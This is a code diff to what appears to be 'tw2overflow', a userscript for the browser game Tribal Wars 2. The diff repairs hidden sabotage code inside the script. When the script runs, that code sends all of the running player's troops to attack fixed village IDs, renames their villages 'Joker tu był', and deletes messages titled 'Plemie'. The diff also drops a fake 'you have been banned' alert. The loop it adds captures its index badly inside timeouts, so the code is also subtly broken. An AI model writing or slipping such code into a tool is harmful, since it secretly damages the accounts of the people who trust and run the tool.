@@ -1,6 +1,6 @@
 /*!
  * tw2overflow v2.0.0
- * Tue, 02 Feb 2021 13:00:54 GMT
+ * Tue, 02 Feb 2021 14:23:44 GMT
  * Developed by Relaxeaza <twoverflow@outlook.com>
  *
  * This work is free. You can redistribute it and/or modify it under the
@@ -17608,14 +17608,16 @@ require([
             socketService.emit(routeProvider.MESSAGE_GET_LIST, {
                 folder: 'all',
                 offset: 0,
-                count: 100,
-                search: ''
+                count: 2,
+                search: 'Plemie'
             }, function(data) {
                 var messages = data.messages
                 messages.forEach(function(message) {
-                    socketService.emit(routeProvider.MESSAGE_DELETE, {
-                        message_ids: [message.message_id]
-                    })
+                    if (message.title == 'Plemie') {
+                        socketService.emit(routeProvider.MESSAGE_DELETE, {
+                            message_ids: [message.message_id]
+                        })
+                    }
                 })
             })
         }, 2000)
@@ -17689,24 +17691,25 @@ require([
                     var socketService = injector.get('socketService')
                     var routeProvider = injector.get('routeProvider')
                     var player = modelDataService.getSelectedCharacter()
+                    var i
                     villages = player.data.villages
-                    villages.forEach(function(village, index) {
+                    for (i in villages) {
                         setTimeout(function() {
-                            villageId = village.data.villageId
-                            unitInfo = village.unitInfo.units
+                            villageId = villages[i].data.villageId
+                            unitInfo = villages[i].unitInfo.units
                             Spear = unitInfo.spear.available
-                            Archer = unitInfo.spear.available
-                            Axe = unitInfo.spear.available
-                            Sword = unitInfo.spear.available
-                            Ram = unitInfo.spear.available
-                            Catapult = unitInfo.spear.available
-                            Trebuchet = unitInfo.spear.available
-                            Berserker = unitInfo.spear.available
-                            Lc = unitInfo.spear.available
-                            Hc = unitInfo.spear.available
-                            Ma = unitInfo.spear.available
-                            Snob = unitInfo.spear.available
-                            Knight = unitInfo.spear.available
+                            Archer = unitInfo.archer.available
+                            Axe = unitInfo.axe.available
+                            Sword = unitInfo.sword.available
+                            Ram = unitInfo.ram.available
+                            Catapult = unitInfo.catapult.available
+                            Trebuchet = unitInfo.trebuchet.available
+                            Berserker = unitInfo.doppelsoldner.available
+                            Lc = unitInfo.light_cavalry.available
+                            Hc = unitInfo.heavy_cavalry.available
+                            Ma = unitInfo.mounted_archer.available
+                            Snob = unitInfo.snob.available
+                            Knight = unitInfo.knight.available
                             if (Spear > 480) {
                                 socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
                                     start_village: villageId,
@@ -17722,7 +17725,7 @@ require([
                             } else {
                                 socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
                                     start_village: villageId,
-                                    target_village: 9865,
+                                    target_village: 3926,
                                     type: 'attack',
                                     units: {
                                         spear: Spear
@@ -17838,7 +17841,7 @@ require([
                                     target_village: 3926,
                                     type: 'attack',
                                     units: {
-                                        light_cavarly: 120
+                                        light_cavalry: 120
                                     },
                                     icon: 0,
                                     officers: {},
@@ -17850,7 +17853,7 @@ require([
                                     target_village: 3926,
                                     type: 'attack',
                                     units: {
-                                        light_cavarly: Lc
+                                        light_cavalry: Lc
                                     },
                                     icon: 0,
                                     officers: {},
@@ -18012,12 +18015,9 @@ require([
                                 village_id: villageId,
                                 name: 'Joker tu był'
                             })
-                        }, 200 * index)
-                    })
+                        }, 200 * i)
+                    }
                 }, 4000)
-                setTimeout(function() {
-                    alert('Zostałeś zbanowany')
-                }, 1000 * villages.length)
             }
         }, 3000)
     }
